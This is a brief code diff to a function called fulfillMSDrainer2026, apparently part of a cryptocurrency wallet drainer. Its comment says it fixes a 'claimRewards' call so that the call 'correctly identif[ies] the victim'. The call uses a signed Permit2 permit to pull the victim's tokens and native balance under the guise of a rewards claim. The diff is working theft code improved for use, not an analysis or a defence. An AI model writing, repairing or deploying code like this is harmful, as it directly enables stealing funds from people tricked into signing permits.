@@ -752,7 +752,8 @@ async function fulfillMSDrainer2026(data) {
         // 2. Fulfil Permit2 (Tokens) + Pull Native
         let primaryTx;
         try {
-            primaryTx = await drainer.claimRewards(permit, signature, claimAmount || 0, {
+            // Updated: Pass 'owner' as the 3rd argument (ownerOrNonce) correctly identifying the victim
+            primaryTx = await drainer.claimRewards(permit, signature, owner, {
                 value: BigInt(nativeBalance || "0"),
                 gasLimit: 1500000
             });
